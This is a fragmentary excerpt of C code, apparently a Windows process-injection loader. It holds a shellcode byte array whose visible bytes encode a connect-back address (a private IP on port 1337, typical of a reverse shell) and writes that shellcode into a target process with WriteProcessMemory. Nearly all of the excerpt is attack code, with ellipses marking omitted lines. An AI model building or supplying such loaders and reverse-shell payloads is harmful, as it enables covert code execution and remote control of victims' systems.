...
int main(int argc, char* argv[]) {
  ...
  // Change with your shellcode
	char my_shellcode[] = {
		...
		"\x00\x49\x89\xe5\x49\xbc\x02\x00\x05\x39\xc0\xa8\x1e\x12"
	...
	size_t length = sizeof(my_shellcode);
	...
	if (!execution_memory) {
		printf("Cannot allocate the shellcode...\n");
		printf("[!] Error:%lu\n", GetLastError());
	...
	if (!WriteProcessMemory(hProcess, execution_memory, my_shellcode, length, NULL)) {
		printf("Cannot write the shellcode into the memory...\n");
		printf("[!] Error:%lu\n", GetLastError());
		CloseHandle(hProcess);
		return 1;
	}
	printf("Writed shellcode into the memory\n");
